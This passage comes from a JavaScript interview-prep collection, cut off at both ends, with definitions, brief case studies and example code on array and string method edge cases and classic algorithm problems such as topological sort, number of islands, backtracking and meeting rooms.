console.log(merge([[1,3],[2,6],[8,10],[15,18]]));
// [[1,6],[8,10],[15,18]]

// Insert and merge:
function insertInterval(intervals, newInterval) {
  const result = [];
  let i = 0;
  
  // Add all intervals before newInterval:
  while (i < intervals.length && intervals[i][1] < newInterval[0]) {
    result.push(intervals[i]);
    i++;
  }
  
  // Merge overlapping intervals:
  while (i < intervals.length && intervals[i][0] <= newInterval[1]) {
    newInterval[0] = Math.min(newInterval[0], intervals[i][0]);
    newInterval[1] = Math.max(newInterval[1], intervals[i][1]);
    i++;
  }
  result.push(newInterval);
  
  // Add remaining intervals:
  while (i < intervals.length) {
    result.push(intervals[i]);
    i++;
  }
  
  return result;
}
```

---

### Question 228: What is the difference between `Array.prototype.some()` and `Array.prototype.every()` in edge cases?

#### Definition
Both short-circuit, but handle empty arrays differently. `some()` returns false for empty arrays (no element passes), `every()` returns true for empty arrays (vacuously true - all elements pass because there are none). This is important for edge case handling. Both are useful for validation but have different semantics for empty inputs.

#### Real-World Scenario / Case Study
A validation system was using `every()` on potentially empty arrays, which returned true and bypassed validation. The team needed to handle empty arrays explicitly. Understanding the edge case behavior helped write correct validation logic.

#### Example Code
```js
const empty = [];

// some - empty array:
console.log(empty.some(x => x > 0));  // false (no elements to test)

// every - empty array:
console.log(empty.every(x => x > 0));  // true (vacuously true!)

// This can cause bugs:
function validateUsers(users) {
  // BUG: empty array passes validation!
  return users.every(u => u.active && u.verified);
}
validateUsers([]);  // true (should this be true or false?)

// FIX - check length:
function validateUsers(users) {
  if (users.length === 0) return false;  // Explicit handling
  return users.every(u => u.active && u.verified);
}

// Or use some for "at least one":
function hasActiveUsers(users) {
  return users.some(u => u.active);
}
hasActiveUsers([]);  // false (correct - no active users)

// Common patterns:
// Check if all items pass (with empty check):
const allValid = items.length > 0 && items.every(isValid);

// Check if any item passes:
const anyValid = items.some(isValid);  // false for empty (correct)
```

---

### Question 229: How do you implement a course schedule problem (topological sort)?

#### Definition
Course schedule determines if you can finish all courses given prerequisites (can you take all courses?). Like checking if a degree plan is possible. Uses topological sort to detect cycles. If there's a cycle in prerequisites, it's impossible. Classic graph problem.

#### Real-World Scenario / Case Study
An educational platform needed to validate if course sequences were possible. The course schedule algorithm verified feasibility. The system could detect impossible prerequisite chains and suggest alternatives to students.

#### Example Code
```js
function canFinish(numCourses, prerequisites) {
  // Build adjacency list:
  const graph = Array(numCourses).fill(null).map(() => []);
  const inDegree = new Array(numCourses).fill(0);
  
  for (const [course, prereq] of prerequisites) {
    graph[prereq].push(course);
    inDegree[course]++;
  }
  
  // Kahn's algorithm:
  const queue = [];
  for (let i = 0; i < numCourses; i++) {
    if (inDegree[i] === 0) {
      queue.push(i);
    }
  }
  
  let count = 0;
  while (queue.length > 0) {
    const course = queue.shift();
    count++;
    
    for (const nextCourse of graph[course]) {
      inDegree[nextCourse]--;
      if (inDegree[nextCourse] === 0) {
        queue.push(nextCourse);
      }
    }
  }
  
  return count === numCourses;  // All courses can be taken
}

// Get course order:
function findOrder(numCourses, prerequisites) {
  const graph = Array(numCourses).fill(null).map(() => []);
  const inDegree = new Array(numCourses).fill(0);
  
  for (const [course, prereq] of prerequisites) {
    graph[prereq].push(course);
    inDegree[course]++;
  }
  
  const queue = [];
  for (let i = 0; i < numCourses; i++) {
    if (inDegree[i] === 0) {
      queue.push(i);
    }
  }
  
  const order = [];
  while (queue.length > 0) {
    const course = queue.shift();
    order.push(course);
    
    for (const nextCourse of graph[course]) {
      inDegree[nextCourse]--;
      if (inDegree[nextCourse] === 0) {
        queue.push(nextCourse);
      }
    }
  }
  
  return order.length === numCourses ? order : [];
}

// Usage:
console.log(canFinish(2, [[1,0]]));  // true
console.log(canFinish(2, [[1,0],[0,1]]));  // false (cycle)
```

---

### Question 230: What is the difference between `Array.prototype.includes()` and `Set.prototype.has()`?

#### Definition
Both check if a value exists, but `includes` is for arrays (O(n) linear search) while `has` is for Sets (O(1) constant time lookup). `includes` searches through the array, `has` uses hash-based lookup. Use `Set.has()` when you need fast lookups, `includes()` for simple array checks.

#### Real-World Scenario / Case Study
Code was using `array.includes()` in a hot loop checking thousands of values, causing performance issues. Converting to a Set and using `has()` improved lookup time from O(n) to O(1). Performance improved 100x for large datasets.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];
const set = new Set([1, 2, 3, 4, 5]);

// includes - array method (O(n)):
console.log(arr.includes(3));   // true
console.log(arr.includes(10));  // false

// has - Set method (O(1)):
console.log(set.has(3));   // true
console.log(set.has(10));  // false

// Performance difference:
const largeArray = new Array(1000000).fill(0).map((_, i) => i);
const largeSet = new Set(largeArray);

// Array lookup - slow:
largeArray.includes(999999);  // O(n) - checks all elements

// Set lookup - fast:
largeSet.has(999999);  // O(1) - hash lookup

// When to use which:
// Small arrays, infrequent checks:
if (smallArray.includes(value)) { }  // Fine

// Large datasets, frequent checks:
const lookupSet = new Set(largeArray);
if (lookupSet.has(value)) { }  // Much faster

// Check multiple values:
const values = [1, 2, 3];
values.every(v => arr.includes(v));  // O(n*m)
values.every(v => set.has(v));       // O(m) - faster
```

---

### Question 231: How do you implement a number of islands problem (DFS/BFS)?

#### Definition
Number of islands counts connected components of '1's in a 2D grid, where adjacent '1's (horizontally or vertically) form an island. Like counting separate landmasses on a map. Uses DFS or BFS to mark visited cells. Classic graph problem on a grid.

#### Real-World Scenario / Case Study
An image processing system needed to identify connected regions. The number of islands algorithm found these regions efficiently. The system could segment images and identify distinct objects or areas.

#### Example Code
```js
function numIslands(grid) {
  if (!grid || grid.length === 0) return 0;
  
  const m = grid.length;
  const n = grid[0].length;
  let count = 0;
  
  function dfs(i, j) {
    if (i < 0 || i >= m || j < 0 || j >= n || grid[i][j] === '0') {
      return;
    }
    
    grid[i][j] = '0';  // Mark as visited
    
    // Visit all 4 directions:
    dfs(i + 1, j);
    dfs(i - 1, j);
    dfs(i, j + 1);
    dfs(i, j - 1);
  }
  
  for (let i = 0; i < m; i++) {
    for (let j = 0; j < n; j++) {
      if (grid[i][j] === '1') {
        count++;
        dfs(i, j);  // Mark entire island as visited
      }
    }
  }
  
  return count;
}

// BFS version:
function numIslandsBFS(grid) {
  if (!grid || grid.length === 0) return 0;
  
  const m = grid.length;
  const n = grid[0].length;
  let count = 0;
  const directions = [[1,0], [-1,0], [0,1], [0,-1]];
  
  function bfs(startI, startJ) {
    const queue = [[startI, startJ]];
    grid[startI][startJ] = '0';
    
    while (queue.length > 0) {
      const [i, j] = queue.shift();
      
      for (const [di, dj] of directions) {
        const ni = i + di;
        const nj = j + dj;
        
        if (ni >= 0 && ni < m && nj >= 0 && nj < n && grid[ni][nj] === '1') {
          grid[ni][nj] = '0';
          queue.push([ni, nj]);
        }
      }
    }
  }
  
  for (let i = 0; i < m; i++) {
    for (let j = 0; j < n; j++) {
      if (grid[i][j] === '1') {
        count++;
        bfs(i, j);
      }
    }
  }
  
  return count;
}

// Usage:
const grid = [
  ['1','1','0','0','0'],
  ['1','1','0','0','0'],
  ['0','0','1','0','0'],
  ['0','0','0','1','1']
];
console.log(numIslands(grid));  // 3 islands
```

---

### Question 232: What is the difference between `Object.assign()` and object spread in edge cases?

#### Definition
Both copy properties, but handle edge cases differently. `Object.assign` only copies enumerable own properties, skips null/undefined sources. Spread also skips null/undefined but handles getters/setters differently. Spread is more modern and generally preferred. Both do shallow copying.

#### Real-World Scenario / Case Study
Code was using `Object.assign` with null sources, which was silently ignored. The team needed to understand when sources are skipped. Using spread made the code more consistent and predictable.

#### Example Code
```js
const target = { a: 1 };
const source1 = { b: 2 };
const source2 = { c: 3 };

// Object.assign:
const result1 = Object.assign(target, source1, source2);
console.log(result1);  // { a: 1, b: 2, c: 3 }
console.log(target);    // { a: 1, b: 2, c: 3 } - mutated!

// Spread:
const result2 = { ...target, ...source1, ...source2 };
console.log(result2);  // { a: 1, b: 2, c: 3 }
console.log(target);   // { a: 1 } - unchanged

// Edge cases - null/undefined:
Object.assign({}, null, undefined);  // {} (skipped)
{ ...null, ...undefined };           // {} (skipped)

// Getters/setters:
const obj = {
  get value() { return this._value; },
  set value(v) { this._value = v; }
};

// Object.assign - calls getter, sets value:
Object.assign({}, obj);  // { value: undefined } (getter executed)

// Spread - preserves getter/setter:
const spread = { ...obj };  // { value: undefined } (getter executed)
// But getter/setter behavior may differ

// Only enumerable properties:
const obj2 = {};
Object.defineProperty(obj2, 'hidden', {
  value: 'secret',
  enumerable: false
});
Object.assign({}, obj2);  // {} (hidden not copied)
{ ...obj2 };              // {} (hidden not copied)
```

---

### Question 233: How do you implement a combination sum problem (backtracking)?

#### Definition
Combination sum finds all unique combinations of numbers that sum to a target, where numbers can be reused. Like finding all ways to make change. Uses backtracking to explore all possibilities. Different from subset sum - this finds all combinations, not just existence.

#### Real-World Scenario / Case Study
A payment system needed to find all possible payment combinations. The combination sum algorithm found all valid ways. The system could suggest payment options to users, enabling flexible payment methods.

#### Example Code
```js
function combinationSum(candidates, target) {
  const result = [];
  
  function backtrack(remaining, combination, start) {
    if (remaining === 0) {
      result.push([...combination]);
      return;
    }
    
    if (remaining < 0) return;
    
    for (let i = start; i < candidates.length; i++) {
      combination.push(candidates[i]);
      backtrack(remaining - candidates[i], combination, i);  // Can reuse
      combination.pop();
    }
  }
  
  backtrack(target, [], 0);
  return result;
}

// Without reusing numbers:
function combinationSum2(candidates, target) {
  candidates.sort((a, b) => a - b);
  const result = [];
  
  function backtrack(remaining, combination, start) {
    if (remaining === 0) {
      result.push([...combination]);
      return;
    }
    
    for (let i = start; i < candidates.length; i++) {
      // Skip duplicates:
      if (i > start && candidates[i] === candidates[i - 1]) continue;
      
      if (candidates[i] > remaining) break;
      
      combination.push(candidates[i]);
      backtrack(remaining - candidates[i], combination, i + 1);  // No reuse
      combination.pop();
    }
  }
  
  backtrack(target, [], 0);
  return result;
}

// Usage:
console.log(combinationSum([2,3,6,7], 7));
// [[2,2,3], [7]]

console.log(combinationSum2([10,1,2,7,6,1,5], 8));
// [[1,1,6], [1,2,5], [1,7], [2,6]]
```

---

### Question 234: What is the difference between `String.prototype.substring()` and `String.prototype.substr()`?

#### Definition
Both extract substrings, but `substring` uses start and end indices while `substr` uses start and length. `substr` is deprecated - don't use it. `substring` is the modern method. Use `substring` or `slice` (which supports negative indices) instead of `substr`.

#### Real-World Scenario / Case Study
Code was using deprecated `substr`, causing maintenance issues and deprecation warnings. Migrating to `substring` or `slice` fixed the warnings. The team standardized on `slice` for its negative index support.

#### Example Code
```js
const str = 'Hello World';

// substring - start and end indices:
console.log(str.substring(0, 5));   // 'Hello'
console.log(str.substring(6));      // 'World'
console.log(str.substring(5, 1));   // 'ello' (swaps to 1,5)

// substr - DEPRECATED, start and length:
console.log(str.substr(0, 5));      // 'Hello'
console.log(str.substr(6));         // 'World'
console.log(str.substr(6, 3));     // 'Wor' (length, not end!)

// slice - modern alternative (supports negative):
console.log(str.slice(0, 5));       // 'Hello'
console.log(str.slice(-5));          // 'World' (from end)
console.log(str.slice(5, 1));       // '' (doesn't swap)

// Best practice - use slice:
const lastThree = str.slice(-3);    // 'rld'
const middle = str.slice(1, -1);   // 'ello Worl'

// Avoid substr - deprecated:
str.substr(0, 5);  // Deprecation warning in modern JS
```

---

### Question 235: How do you implement a permutation problem (backtracking)?

#### Definition
Permutation finds all arrangements of elements. Like finding all ways to arrange letters in a word. Uses backtracking to generate all possibilities. Can be with or without duplicates. Classic backtracking problem.

#### Real-World Scenario / Case Study
A password generator needed to generate all possible character combinations. The permutation algorithm provided all arrangements. The system could generate secure passwords and test password strength.

#### Example Code
```js
// Permutations without duplicates:
function permute(nums) {
  const result = [];
  
  function backtrack(current) {
    if (current.length === nums.length) {
      result.push([...current]);
      return;
    }
    
    for (const num of nums) {
      if (!current.includes(num)) {
        current.push(num);
        backtrack(current);
        current.pop();
      }
    }
  }
  
  backtrack([]);
  return result;
}

// More efficient (swapping):
function permuteSwap(nums) {
  const result = [];
  
  function backtrack(start) {
    if (start === nums.length) {
      result.push([...nums]);
      return;
    }
    
    for (let i = start; i < nums.length; i++) {
      [nums[start], nums[i]] = [nums[i], nums[start]];  // Swap
      backtrack(start + 1);
      [nums[start], nums[i]] = [nums[i], nums[start]];  // Backtrack
    }
  }
  
  backtrack(0);
  return result;
}

// With duplicates (avoid duplicates):
function permuteUnique(nums) {
  nums.sort((a, b) => a - b);
  const result = [];
  const used = new Array(nums.length).fill(false);
  
  function backtrack(current) {
    if (current.length === nums.length) {
      result.push([...current]);
      return;
    }
    
    for (let i = 0; i < nums.length; i++) {
      if (used[i] || (i > 0 && nums[i] === nums[i - 1] && !used[i - 1])) {
        continue;
      }
      
      used[i] = true;
      current.push(nums[i]);
      backtrack(current);
      current.pop();
      used[i] = false;
    }
  }
  
  backtrack([]);
  return result;
}

// Usage:
console.log(permute([1, 2, 3]));
// [[1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1]]
```

---

### Question 236: What is the difference between `Array.prototype.filter()` and `Array.prototype.map()` when filtering?

#### Definition
`filter` returns only elements that pass a test, keeping the array length same or smaller. `map` transforms every element, keeping the same length. If you use `map` to filter (returning undefined for unwanted elements), you get an array with undefined values. Use `filter` to remove elements, `map` to transform them.

#### Real-World Scenario / Case Study
Code was using `map` to filter by returning undefined, creating arrays with holes. This caused bugs when iterating. Using `filter` properly removed unwanted elements. The code became cleaner and more correct.

#### Example Code
```js
const numbers = [1, 2, 3, 4, 5];

// filter - removes elements:
const evens = numbers.filter(n => n % 2 === 0);
console.log(evens);  // [2, 4] (length 2)

// map - transforms all elements:
const doubled = numbers.map(n => n * 2);
console.log(doubled);  // [2, 4, 6, 8, 10] (length 5)

// BUGGY - using map to filter:
const evensBad = numbers.map(n => n % 2 === 0 ? n : undefined);
console.log(evensBad);  // [undefined, 2, undefined, 4, undefined] (length 5!)

// FIX - use filter:
const evensGood = numbers.filter(n => n % 2 === 0);
console.log(evensGood);  // [2, 4] (length 2)

// Combine - filter then map:
const doubledEvens = numbers
  .filter(n => n % 2 === 0)
  .map(n => n * 2);
console.log(doubledEvens);  // [4, 8]

// vs wrong order:
const wrong = numbers
  .map(n => n * 2)
  .filter(n => n % 2 === 0);
// Works but processes all elements first
```

---

### Question 237: How do you implement a N-Queens problem (backtracking)?

#### Definition
N-Queens places N queens on an N×N chessboard so no two queens attack each other. Like solving a puzzle where queens can't be in same row, column, or diagonal. Uses backtracking to try placements and backtrack when conflicts occur. Classic constraint satisfaction problem.

#### Real-World Scenario / Case Study
A scheduling system needed to assign resources without conflicts. The N-Queens algorithm provided conflict-free assignments. The system could schedule events, meetings, or resources efficiently while avoiding conflicts.

#### Example Code
```js
function solveNQueens(n) {
  const result = [];
  const board = Array(n).fill(null).map(() => Array(n).fill('.'));
  
  function isValid(row, col) {
    // Check column:
    for (let i = 0; i < row; i++) {
      if (board[i][col] === 'Q') return false;
    }
    
    // Check diagonals:
    for (let i = row - 1, j = col - 1; i >= 0 && j >= 0; i--, j--) {
      if (board[i][j] === 'Q') return false;
    }
    
    for (let i = row - 1, j = col + 1; i >= 0 && j < n; i--, j++) {
      if (board[i][j] === 'Q') return false;
    }
    
    return true;
  }
  
  function backtrack(row) {
    if (row === n) {
      result.push(board.map(r => r.join('')));
      return;
    }
    
    for (let col = 0; col < n; col++) {
      if (isValid(row, col)) {
        board[row][col] = 'Q';
        backtrack(row + 1);
        board[row][col] = '.';  // Backtrack
      }
    }
  }
  
  backtrack(0);
  return result;
}

// Count solutions only:
function totalNQueens(n) {
  let count = 0;
  const board = Array(n).fill(null).map(() => Array(n).fill(false));
  
  function isValid(row, col) {
    for (let i = 0; i < row; i++) {
      if (board[i][col]) return false;
      const diff = row - i;
      if (col - diff >= 0 && board[i][col - diff]) return false;
      if (col + diff < n && board[i][col + diff]) return false;
    }
    return true;
  }
  
  function backtrack(row) {
    if (row === n) {
      count++;
      return;
    }
    
    for (let col = 0; col < n; col++) {
      if (isValid(row, col)) {
        board[row][col] = true;
        backtrack(row + 1);
        board[row][col] = false;
      }
    }
  }
  
  backtrack(0);
  return count;
}

// Usage:
console.log(solveNQueens(4));
// [['.Q..','...Q','Q...','..Q.'], ['..Q.','Q...','...Q','.Q..']]
```

---

### Question 238: What is the difference between `Array.prototype.find()` and `Array.prototype.filter()[0]`?

#### Definition
Both can find an element, but `find` returns the first match and stops (short-circuits), while `filter()[0]` processes all elements then takes the first. `find` is more efficient - it stops at the first match. Use `find` when you need one element, `filter` when you need all matches.

#### Real-World Scenario / Case Study
Code was using `filter()[0]` to find a single user, processing all 10,000 users unnecessarily. Using `find()` stopped at the first match, improving performance 1000x. The code also became clearer about intent.

#### Example Code
```js
const users = [
  { id: 1, name: 'John', active: true },
  { id: 2, name: 'Jane', active: false },
  { id: 3, name: 'Bob', active: true }
];

// find - stops at first match:
const user = users.find(u => u.id === 2);
console.log(user);  // { id: 2, name: 'Jane', active: false }

// filter()[0] - processes all:
const user2 = users.filter(u => u.id === 2)[0];
console.log(user2);  // Same result, but slower

// Performance difference:
const largeArray = new Array(100000).fill(0).map((_, i) => ({ id: i }));

// find - stops at first match:
largeArray.find(x => x.id === 50000);  // Checks ~50000 elements

// filter - processes all:
largeArray.filter(x => x.id === 50000)[0];  // Checks all 100000!

// Edge cases:
users.find(u => u.id === 999);      // undefined (not found)
users.filter(u => u.id === 999)[0];  // undefined (empty array[0])

// When to use which:
// Need one element:
const activeUser = users.find(u => u.active);  // First active user

// Need all matches:
const activeUsers = users.filter(u => u.active);  // All active users
```

---

### Question 239: How do you implement a generate parentheses problem (backtracking)?

#### Definition
Generate parentheses creates all valid combinations of n pairs of parentheses. Like generating all balanced expressions with n pairs. Uses backtracking, keeping track of open and close counts. Must have valid nesting - can't close before opening.

#### Real-World Scenario / Case Study
A code generator needed to create valid nested structures. The generate parentheses algorithm provided all valid combinations. The system could generate test cases and validate nested expressions.

#### Example Code
```js
function generateParenthesis(n) {
  const result = [];
  
  function backtrack(current, open, close) {
    // Base case - used all parentheses:
    if (current.length === n * 2) {
      result.push(current);
      return;
    }
    
    // Can add opening if we haven't used all:
    if (open < n) {
      backtrack(current + '(', open + 1, close);
    }
    
    // Can add closing if we have more open than close:
    if (close < open) {
      backtrack(current + ')', open, close + 1);
    }
  }
  
  backtrack('', 0, 0);
  return result;
}

// Usage:
console.log(generateParenthesis(3));
// ['((()))', '(()())', '(())()', '()(())', '()()()']

// Count only:
function catalanNumber(n) {
  // Number of valid parentheses = Catalan number
  let res = 1;
  for (let i = 0; i < n; i++) {
    res = res * (2 * n - i) / (i + 1);
  }
  return res / (n + 1);
}
```

---

### Question 240: What is the difference between `Array.prototype.reduce()` with and without initial value?

#### Definition
`reduce` can take an initial value. Without it, the first element becomes the initial value and iteration starts from the second element. With an initial value, iteration starts from the first element. This matters for empty arrays (without initial value, it throws an error) and for the accumulator type.

#### Real-World Scenario / Case Study
Code was calling `reduce` on potentially empty arrays without an initial value, causing runtime errors. Adding an initial value made the code safe for empty arrays. The team also used initial values to control the accumulator type (number vs object vs array).

#### Example Code
```js
const numbers = [1, 2, 3, 4];

// Without initial value - first element is initial:
const sum1 = numbers.reduce((acc, val) => acc + val);
console.log(sum1);  // 10
// acc starts as 1, processes 2, 3, 4

// With initial value:
const sum2 = numbers.reduce((acc, val) => acc + val, 0);
console.log(sum2);  // 10
// acc starts as 0, processes 1, 2, 3, 4

// Empty array - without initial value:
[].reduce((acc, val) => acc + val);  // TypeError!

// Empty array - with initial value:
[].reduce((acc, val) => acc + val, 0);  // 0 (safe)

// Different accumulator types:
// Without initial - accumulator type = first element type:
const result1 = numbers.reduce((acc, val) => acc + val);
// acc is number

// With initial - accumulator type = initial value type:
const result2 = numbers.reduce((acc, val) => {
  acc.push(val * 2);
  return acc;
}, []);  // acc is array
// [2, 4, 6, 8]

// Building objects:
const users = [{ name: 'John', age: 30 }, { name: 'Jane', age: 25 }];
const ageMap = users.reduce((acc, user) => {
  acc[user.name] = user.age;
  return acc;
}, {});  // {} is required!
// { John: 30, Jane: 25 }
```

---

### Question 241: How do you implement a serialize and deserialize binary tree?

#### Definition
Serialize converts a binary tree to a string representation, deserialize reconstructs the tree from the string. Like saving a tree structure to a file and loading it back. Useful for storing trees in databases or transmitting over networks. Can use pre-order traversal with markers for null nodes.

#### Real-World Scenario / Case Study
A system needed to store binary tree structures in a database. Serialization converted trees to strings for storage. Deserialization reconstructed trees when loading. The system could persist complex tree structures efficiently.

#### Example Code
```js
function serialize(root) {
  const result = [];
  
  function preOrder(node) {
    if (!node) {
      result.push('null');
      return;
    }
    result.push(node.val.toString());
    preOrder(node.left);
    preOrder(node.right);
  }
  
  preOrder(root);
  return result.join(',');
}

function deserialize(data) {
  const values = data.split(',');
  let index = 0;
  
  function buildTree() {
    if (values[index] === 'null') {
      index++;
      return null;
    }
    
    const node = { val: parseInt(values[index]), left: null, right: null };
    index++;
    node.left = buildTree();
    node.right = buildTree();
    return node;
  }
  
  return buildTree();
}
```

---

### Question 242: What is the difference between `Array.prototype.sort()` with and without comparator?

#### Definition
`sort()` without a comparator converts elements to strings and sorts lexicographically (alphabetically). With a comparator function, you control the sorting logic. Numbers sorted without comparator become strings: [10, 2, 1] becomes [1, 10, 2]. Always provide a comparator for numbers or custom sorting.

#### Real-World Scenario / Case Study
Code was sorting numbers without a comparator, causing [10, 2, 1] to become [1, 10, 2] (string sort). Adding a numeric comparator fixed the sorting. The team learned to always provide comparators for non-string data.

#### Example Code
```js
const numbers = [10, 2, 1, 20];

// Without comparator - string sort:
numbers.sort();
console.log(numbers);  // [1, 10, 2, 20] (WRONG for numbers!)

// With comparator - numeric sort:
numbers.sort((a, b) => a - b);
console.log(numbers);  // [1, 2, 10, 20] (correct)

// Descending:
numbers.sort((a, b) => b - a);  // [20, 10, 2, 1]

// Objects:
const users = [{ age: 30 }, { age: 25 }, { age: 35 }];
users.sort((a, b) => a.age - b.age);  // Sort by age
```

---

### Question 243: How do you implement a reverse linked list problem?

#### Definition
Reverse linked list reverses the order of nodes - the last becomes first, first becomes last. Like turning a chain around. Can be done iteratively (change pointers as you go) or recursively. Classic linked list problem.

#### Real-World Scenario / Case Study
A system needed to reverse processing order of items. The reverse linked list algorithm provided efficient reversal. The system could process items in reverse order without creating new data structures.

#### Example Code
```js
// Iterative:
function reverseList(head) {
  let prev = null;
  let current = head;
  
  while (current) {
    const next = current.next;
    current.next = prev;
    prev = current;
    current = next;
  }
  
  return prev;
}

// Recursive:
function reverseListRecursive(head) {
  if (!head || !head.next) return head;
  
  const reversed = reverseListRecursive(head.next);
  head.next.next = head;
  head.next = null;
  return reversed;
}
```

---

### Question 244: What is the difference between `String.prototype.charCodeAt()` and `String.prototype.codePointAt()` for emojis?

#### Definition
Both get character codes, but `charCodeAt` returns UTF-16 code units (can be incomplete for emojis) while `codePointAt` returns full Unicode code points. For emojis and high Unicode, `codePointAt` is correct. `charCodeAt` may return surrogate pairs incorrectly.

#### Real-World Scenario / Case Study
A text processing system was using `charCodeAt` for emoji analysis, getting incorrect values. Switching to `codePointAt` correctly handled all Unicode characters including emojis.

#### Example Code
```js
const emoji = '😀';
emoji.charCodeAt(0);    // 55357 (high surrogate, incomplete)
emoji.codePointAt(0);   // 128512 (correct Unicode)
```

---

### Question 245: How do you implement a rotate array problem?

#### Definition
Rotate array shifts elements right by k positions, with elements wrapping around. Like rotating a dial. Can be done with reverse operations or by creating a new array. Classic array manipulation problem.

#### Real-World Scenario / Case Study
A carousel component needed to rotate items. The rotate algorithm provided efficient rotation. The UI could cycle through items smoothly.

#### Example Code
```js
function rotate(nums, k) {
  k = k % nums.length;
  reverse(nums, 0, nums.length - 1);
  reverse(nums, 0, k - 1);
  reverse(nums, k, nums.length - 1);
}

function reverse(arr, start, end) {
  while (start < end) {
    [arr[start], arr[end]] = [arr[end], arr[start]];
    start++;
    end--;
  }
}
```

---

### Question 246: What is the difference between `Object.getPrototypeOf()` and `__proto__`?

#### Definition
Both access an object's prototype, but `getPrototypeOf` is the standard method while `__proto__` is a deprecated non-standard property. `getPrototypeOf` is recommended. `__proto__` can be overridden and isn't in the spec (though widely supported).

#### Real-World Scenario / Case Study
Code was using `__proto__` which caused issues in some environments. Switching to `Object.getPrototypeOf()` made the code standards-compliant and more reliable.

#### Example Code
```js
const obj = {};
Object.getPrototypeOf(obj) === Object.prototype;  // true (standard)
obj.__proto__ === Object.prototype;              // true (deprecated)
```

---

### Question 247: How do you implement a group anagrams problem?

#### Definition
Group anagrams groups words that are anagrams (same letters, different order). Like finding all words that can be made from the same letters. Uses sorting or character counting to create keys. Classic hash map problem.

#### Real-World Scenario / Case Study
A word game needed to group anagrams. The algorithm efficiently grouped words. The system could suggest word variations and find related words.

#### Example Code
```js
function groupAnagrams(strs) {
  const map = new Map();
  
  for (const str of strs) {
    const key = str.split('').sort().join('');
    if (!map.has(key)) {
      map.set(key, []);
    }
    map.get(key).push(str);
  }
  
  return Array.from(map.values());
}
```

---

### Question 248: What is the difference between `Array.prototype.some()` returning early and `Array.prototype.every()` returning early?

#### Definition
Both short-circuit, but `some` stops at first truthy (success), `every` stops at first falsy (failure). `some` is optimistic (finds success), `every` is pessimistic (finds failure). Both improve performance by not checking all elements.

#### Real-World Scenario / Case Study
Code was checking all elements unnecessarily. Using `some` and `every` with short-circuiting improved performance significantly for large arrays.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];
arr.some(x => x > 3);   // Stops at 4 (first truthy)
arr.every(x => x < 3);  // Stops at 3 (first falsy)
```

---

### Question 249: How do you implement a product of array except self problem?

#### Definition
Product except self creates an array where each element is the product of all other elements. Like multiplying everything except the current element. Can be done with two passes (left products, then right products) for O(n) time without division.

#### Real-World Scenario / Case Study
A calculation system needed products excluding current elements. The algorithm provided efficient calculation. The system could compute complex metrics without expensive operations.

#### Example Code
```js
function productExceptSelf(nums) {
  const result = new Array(nums.length).fill(1);
  
  // Left products:
  for (let i = 1; i < nums.length; i++) {
    result[i] = result[i - 1] * nums[i - 1];
  }
  
  // Right products:
  let right = 1;
  for (let i = nums.length - 1; i >= 0; i--) {
    result[i] *= right;
    right *= nums[i];
  }
  
  return result;
}
```

---

### Question 250: What is the difference between `Object.create(null)` and `{}`?

#### Definition
Both create objects, but `Object.create(null)` creates an object with no prototype (no inheritance from Object.prototype), while `{}` inherits from Object.prototype. `Object.create(null)` is a "pure" dictionary with no inherited methods. Useful when you want a clean object without Object methods.

#### Real-World Scenario / Case Study
Code needed objects without inherited methods for security (preventing prototype pollution). Using `Object.create(null)` created safe objects. The system was protected from prototype pollution attacks.

#### Example Code
```js
const obj1 = {};
obj1.toString;  // function (inherited from Object.prototype)

const obj2 = Object.create(null);
obj2.toString;  // undefined (no prototype)

// Safe dictionary:
const safeMap = Object.create(null);
safeMap['key'] = 'value';  // No inherited properties
```

---

### Question 251: How do you implement a meeting rooms problem?

#### Definition
Meeting rooms determines if you can attend all meetings (no overlaps) or how many rooms needed for all meetings. Like scheduling without conflicts. Uses sorting and checking overlaps. Classic interval problem.

#### Real-World Scenario / Case Study
A calendar system needed to check meeting conflicts. The algorithm verified if schedules were possible. The system could suggest available times and prevent double-booking.

#### Example Code
```js
function canAttendMeetings(intervals) {
  intervals.sort((a, b) => a[0] - b[0]);
  
  for (let i = 1; i < intervals.length; i++) {
    if (intervals[i][0] < intervals[i - 1][1]) {
      return false;  // Overlap
    }
  }
  return true;
}

function minMeetingRooms(intervals) {
  const starts = intervals.map(i => i[0]).sort((a, b) => a - b);
  const ends = intervals.map(i => i[1]).sort((a, b) => a - b);
  
  let rooms = 0;
  let endIndex = 0;
  
  for (let start of starts) {
    if (start < ends[endIndex]) {
      rooms++;
    } else {
      endIndex++;
    }
  }
  
  return rooms;
}
```

---

### Question 252: What is the difference between `Array.prototype.forEach()` and `for...of` loop?

#### Definition
Both iterate arrays, but `forEach` is a method that takes a callback, while `for...of` is a loop construct. `for...of` supports `break` and `continue`, `forEach` doesn't. `for...of` works with any iterable, `forEach` is array-specific. Use `for...of` when you need control flow, `forEach` for simple iteration.

#### Real-World Scenario / Case Study
Code needed to break out of iteration early, but `forEach` doesn't support `break`. Switching to `for...of` allowed early termination. The code became more efficient by stopping when conditions were met.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];

// forEach - can't break:
arr.forEach(x => {
  if (x === 3) return;  // Only exits callback, continues iteration
  console.log(x);
});

// for...of - can break:
for (const x of arr) {
  if (x === 3) break;  // Exits loop completely
  console.log(x);
}
```

---

### Question 253: How do you implement a valid anagram problem?

#### Definition
Valid anagram checks if two strings are anagrams (same characters, different order). Like checking if words use the same letters. Can use sorting (compare sorted strings) or character counting (compare character frequencies). Classic string problem.

#### Real-World Scenario / Case Study
A word game needed to validate anagrams. The algorithm efficiently checked if words were anagrams. The system could verify word relationships and suggest anagram matches.

#### Example Code
```js
function isAnagram(s, t) {
  if (s.length !== t.length) return false;
  
  // Character counting:
  const count = {};
  for (const char of s) {
    count[char] = (count[char] || 0) + 1;
  }
  for (const char of t) {
    if (!count[char]) return false;
    count[char]--;
  }
  return true;
}

// Or sorting:
function isAnagramSort(s, t) {
  return s.split('').sort().join('') === t.split('').sort().join('');
}
```

---

### Question 254: What is the difference between `Array.prototype.map()` returning undefined and `Array.prototype.filter()`?

#### Definition
`map` transforms every element (same length, may include undefined), `filter` selects elements (smaller length, no undefined). If `map` returns undefined for some elements, you get an array with holes. `filter` removes elements entirely. Use `map` to transform, `filter` to remove.

#### Real-World Scenario / Case Study
Code was using `map` to filter by returning undefined, creating arrays with undefined values. This caused bugs. Using `filter` properly removed unwanted elements.

#### Example Code
```js
const numbers = [1, 2, 3, 4, 5];

// map with undefined:
const evens = numbers.map(n => n % 2 === 0 ? n : undefined);
// [undefined, 2, undefined, 4, undefined] (length 5)

// filter:
